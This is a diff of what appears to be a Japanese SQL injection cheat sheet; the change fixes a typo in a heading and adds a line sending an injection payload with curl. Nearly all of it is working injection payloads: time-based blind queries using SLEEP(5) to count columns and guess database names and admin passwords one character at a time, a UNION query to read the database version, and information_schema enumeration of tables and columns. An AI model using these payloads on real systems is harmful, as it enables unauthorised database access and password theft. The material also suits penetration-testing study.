@@ -37,8 +37,9 @@ UNION SELECT SLEEP(5),2;--　#応答が５秒停止したらカラム数は２�
 union select sleep(5),2 where database() like 'a%';-- - #一文字ずつ停止する文字を総当たり
 UNION SELECT SLEEP(5),2 from テーブル名 where カラム名='admin' and カラム名 like 'a%';-- - #テーブル名、カラム名を特定し、ユーザ名やパスワードを１文字ずつ試す
 
-//バージン情報の列挙
+//バージョン情報の列挙
 1' and 1=0 union select version(),null,null,null;-- -
+curl <url> -d "<sql>;-- -" #コマンドラインからcurlでもできる
 
 //テーブル名：カラム名の列挙
 UNION SELECT column_name, table_name, null information_schema.columns;-- -
